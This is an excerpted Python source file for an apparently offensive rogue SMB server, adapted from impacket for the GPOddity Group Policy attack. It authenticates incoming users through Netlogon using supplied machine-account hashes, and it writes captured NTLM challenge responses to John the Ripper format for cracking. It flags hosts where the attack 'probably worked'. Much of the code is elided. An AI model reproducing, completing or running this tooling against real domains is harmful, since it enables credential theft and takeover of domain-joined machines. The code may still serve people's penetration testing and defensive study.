...
from impacket.dcerpc.v5.rpcrt import DCERPCException, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_AUTHN_NETLOGON
from impacket.nt_errors import STATUS_LOGON_FAILURE, STATUS_SUCCESS, STATUS_ACCESS_DENIED, STATUS_NOT_SUPPORTED, \
    STATUS_MORE_PROCESSING_REQUIRED
from impacket.ntlm import AV_PAIRS, NTLMSSP_AV_HOSTNAME, generateEncryptedSessionKey
...
def getNetlogonSessionKey(domainIp, challenge, machineCredentials, authenticateMessage):
    # Here we will use netlogon to get the signing session key
    logger.info(f"[INFO - NETLOGON] Connecting to {domainIp} NETLOGON service")

    machineAccount = machineCredentials["machineName"]
    machineHashes = f"{machineCredentials['machineLM'].hex()}:{machineCredentials['machineNT'].hex()}"
    ...
    logger.info(f"[INFO - NETLOGON] authenticateMessage serverName is: '{serverName}'")


    rpctransport = transport.DCERPCTransportFactory(stringBinding)

    if len(machineHashes) > 0:
        lmhash, nthash = machineHashes.split(':')
    else:
        lmhash = ''
        nthash = ''
    ...
    logger.info(f"[INFO - NETLOGON] Bind() for rpctransport successful")

    resp = nrpc.hNetrServerReqChallenge(dce, NULL, serverName+'\x00', b'12345678')
    logger.info(f"[INFO - NETLOGON] hNetrServerReqChallenge request successful")
    ...
    if machineHashes == '':
        ...
        ntHash = unhexlify(machineHashes.split(':')[1])

    sessionKey = nrpc.ComputeSessionKeyStrongKey('', b'12345678', serverChallenge, ntHash)
    #sessionKey = nrpc.ComputeSessionKeyAES('', b'12345678', serverChallenge, ntHash)
    logger.info(f"[INFO - NETLOGON] Computed netlogon session strong key - {sessionKey.hex}")

    ppp = nrpc.ComputeNetlogonCredential(b'12345678', sessionKey)
    #ppp = nrpc.ComputeNetlogonCredentialAES(b'12345678', sessionKey)
    logger.info(f"[INFO - NETLOGON] Computed netlogon credentials from session key - {ppp}")
    ...
    nrpc.hNetrServerAuthenticate3(dce, NULL, machineAccount + '\x00',
                                    ...
                                    ppp, 0x600FFFFF)
    logger.info(f"[INFO - NETLOGON] hNetrServerAuthenticate3 call successfull - netlogon authenticated")
    ...
    dce2.set_session_key(sessionKey)
    logger.info(f"[INFO - NETLOGON] Switched netlogon context ; auth_type -> RPC_C_AUTHN_NETLOGON ; auth_level -> RPC_C_AUTHN_LEVEL_PKT_PRIVACY")

    # Now let's try to verify the security blob against the PDC
    logger.info(f"[INFO - NETLOGON] Now trying to validate the security blob against the PDC")
    ...
    # Important ; if we want to authenticate a DC or a computer account, we should enable the K and E bits for ParameterControl
    ...
    logger.info(f"[INFO - NETLOGON] Built the NetrLogonSamLogonWithFlags request")

    #request.dump()
    try:
        resp = dce2.request(request)
        #resp.dump()
    ...
    #sleep(20)
    logger.warning(f"{bcolors.OKGREEN}[+] Successfully authenticated {domainName}\\{authenticateMessage['user_name'].decode('utf-16le')} through Netlogon{bcolors.ENDC}")
...
def outputToJohnFormat(challenge, username, domain, lmresponse, ntresponse):
    ...
    try:
        ...
        try:
            ...
            import traceback
            traceback.print_exc()
            logger.error("outputToJohnFormat: %s" % e)
            pass
...
def openFile(path, fileName, accessMode, fileAttributes, openMode):
    ...
    if not isInFileJail(path, fileName):
        logger.error("Path not in current working directory")
    ...
    try:
        ...
        logger.error("openFile: %s,%s" % (pathName, mode), e)
        fid = 0
...
def findFirst2(path, fileName, level, searchAttributes, pktFlags=smb.SMB.FLAGS2_UNICODE, isSMB2=False):
    ...
    for i in files:
        if level == smb.SMB_FIND_FILE_BOTH_DIRECTORY_INFO or level == smb2.SMB2_FILE_BOTH_DIRECTORY_INFO:
            ...
            logger.error("Wrong level %d!" % level)
    ...
    try:
        ...
        if os.path.exists(pathName):
            ...
            if level == smb.SMB_QUERY_FILE_BASIC_INFO:
                ...
                logger.error('Unknown level for query path info! 0x%x' % level)
                # UNSUPPORTED
        ...
        logger.error('queryPathInfo: %s' % e)
        raise
...
class SMBCommands:
                ...
                if setup == b'' and parameters == b'' and data == b'':
                    ...
                    while remainingData > 0 or remainingParameters > 0:
                        ...
                        if len(data) > transParameters['MaxDataCount']:
                            ...
                            logger.debug("Lowering answer from %d to %d" % (len(data), transParameters['MaxDataCount']))
                ...
                if setup == b'' and parameters == b'' and data == b'':
                    ...
                    while remainingData > 0 or remainingParameters > 0:
                        ...
                        if len(data) > NTTransParameters['MaxDataCount']:
                            # Answer doesn't fit in this packet
                            logger.debug("Lowering answer from %d to %d" % (len(data), NTTransParameters['MaxDataCount']))
                ...
                if setup == b'' and parameters == b'' and data == b'':
                    ...
                    while remainingData > 0 or remainingParameters > 0:
                        ...
                        if len(data) > trans2Parameters['MaxDataCount']:
                            # Answer doesn't fit in this packet
                            logger.debug("Lowering answer from %d to %d" % (len(data), trans2Parameters['MaxDataCount']))
    ...
    def smbComNtCreateAndX(connId, smbServer, SMBCommand, recvPacket):
        ...
        if recvPacket['Tid'] in connData['ConnectedShares']:
            ...
            if ntCreateAndXParameters['RootFid'] > 0:
                ...
                logger.debug("RootFid present %s!" % path)
            else:
    ...
    def smbComSessionSetupAndX(connId, smbServer, SMBCommand, recvPacket):
        print("[DEBUG] smbComSessionSetupAndX starting !")
        ...
        if SMBCommand['WordCount'] == 12:
            ...
            if messageType == 0x01:
                ...
                if errorCode == STATUS_SUCCESS:
                    ...
                    smbServer.log(
                        'User %s\\%s authenticated successfully :D' % (authenticateMessage['host_name'].decode('utf-16le'),
                    ...
                    smbServer.log("Could not authenticate user! [DEBUG 1]")
...
class SMB2Commands:
    ...
    def smb2SessionSetup(connId, smbServer, recvPacket):
        ...
        if messageType == 0x01:
            ...
            # Generate the AV_PAIRS
            av_pairs = ntlm.AV_PAIRS()
            av_pairs[ntlm.NTLMSSP_AV_HOSTNAME] = smbServer.getServerName().encode('utf-16le')
            av_pairs[ntlm.NTLMSSP_AV_DNS_HOSTNAME] = f"{smbServer.getServerName()}.{smbServer.getServerDomain()}".encode('utf-16le')
            av_pairs[ntlm.NTLMSSP_AV_DOMAINNAME] = smbServer.getServerDomain().split('.')[0].encode('utf-16le')
            ...
            authenticateMessage = ntlm.NTLMAuthChallengeResponse()
            authenticateMessage.fromString(token)
            logger.warning(f"{bcolors.BOLD}[*] Received an authentication request from {authenticateMessage['domain_name'].decode('utf-16le')}\\{authenticateMessage['user_name'].decode('utf-16le')},{authenticateMessage['host_name'].decode('utf-16le')}{bcolors.ENDC}")
            ...
            # Do we have credentials to check?
            do_netlogon = smbServer.getNetlogonconfig()
            if do_netlogon is False:
                errorCode = STATUS_SUCCESS
            elif len(smbServer.getCredentials()) > 0:
                logger.warning("[*] Validating user through netlogon service")

                errorCode, sessionKey = getNetlogonSessionKey(smbServer.getServerDomain(),
                                                              smbServer.getSMBChallenge(),
                                                              smbServer.getCredentials(),
                                                              authenticateMessage)
                if sessionKey is not None:
                ...
                '''identity = authenticateMessage['user_name'].decode('utf-16le').lower()
                # Do we have this user's credentials?
                if identity in smbServer.getCredentials() or 1==1:
                    print("[DEBUG] We have this username")
                    # Process data:
                    # Let's parse some data and keep it to ourselves in case it is asked
                    uid, lmhash, nthash = smbServer.getCredentials()[identity]
                    ...
                    print(f"[DEBUG] Computed NTLMv2. errorCode: {errorCode} - sessionKey: {sessionKey}")
                    print(f"[DEBUG] sessionKey length is {len(sessionKey)}")

                    if sessionKey is not None:
                        print("[DEBUG] sessionKey is not none. Enabling signing")
                        #connData['SignatureEnabled'] = False
                        connData['SignatureEnabled'] = True
                        connData['SigningSessionKey'] = sessionKey
                        connData['SignSequenceNumber'] = 1
            ...
            if errorCode == STATUS_SUCCESS:
                ...
                # accept-completed
                respToken['NegState'] = b'\x00'
                smbServer.log('User %s\\%s authenticated successfully (pastapesto)' % (
                    authenticateMessage['host_name'].decode('utf-16le'),
                    authenticateMessage['user_name'].decode('utf-16le')))
                # Let's store it in the connection data
                connData['AUTHENTICATE_MESSAGE'] = authenticateMessage
                try:
                    ...
                    ntlm_hash_data = outputToJohnFormat(connData['CHALLENGE_MESSAGE']['challenge'],
                                                        ...
                                                        authenticateMessage['domain_name'],
                                                        authenticateMessage['lanman'], authenticateMessage['ntlm'])
                    logger.warning(ntlm_hash_data['hash_string'])
                    if jtr_dump_path != '':
                        writeJohnOutputToFile(ntlm_hash_data['hash_string'], ntlm_hash_data['hash_version'],
                                              jtr_dump_path)
                except:
                ...
                respToken = SPNEGO_NegTokenResp()
                respToken['NegState'] = b'\x02'
                smbServer.log("Could not authenticate user! [DEBUG 2]")
    ...
    def smb2Read(connId, smbServer, recvPacket):
        ...
        # Some specific log messages for GPOddity
        authenticateMessage = connData['AUTHENTICATE_MESSAGE']
        if os.path.basename(connData['OpenedFiles'][fileID]["FileName"]) == 'gpt.ini':
            logger.warning(f"{bcolors.BOLD}{bcolors.OKGREEN}[+] {authenticateMessage['domain_name'].decode('utf-16le')}\\{authenticateMessage['user_name'].decode('utf-16le')} requested 'gpt.ini' ; ATTACK PROBABLY WORKED FOR THIS HOST ! {bcolors.ENDC}")
...
class SMBSERVER(socketserver.ThreadingMixIn, socketserver.TCPServer):
    ...
    def __init__(self, server_address, netlogon, handler_class=SMBSERVERHandler, config_parser=None):
    ...
    def getNetlogonconfig(self):
        return self.__netlogon
    ...
    def addCredential(self, name, uid, lmhash, nthash):
        ...
        if lmhash != '' or nthash != '':
            ...
            try:  # just in case they were converted already
                ...
                pass
        self.__credentials["machineName"] = name
        self.__credentials["machineLM"] = lmhash
        self.__credentials["machineNT"] = nthash
...
class SimpleSMBServer:
    ...
    def __init__(self, listenAddress, listenPort, domainName, machineName, netlogon=True, configFile=''):
        if configFile != '':
            ...
            self.__smbConfig.set('global', 'server_domain', domainName)
            ...
            self.__server = SMBSERVER((listenAddress, listenPort), netlogon, config_parser=self.__smbConfig)
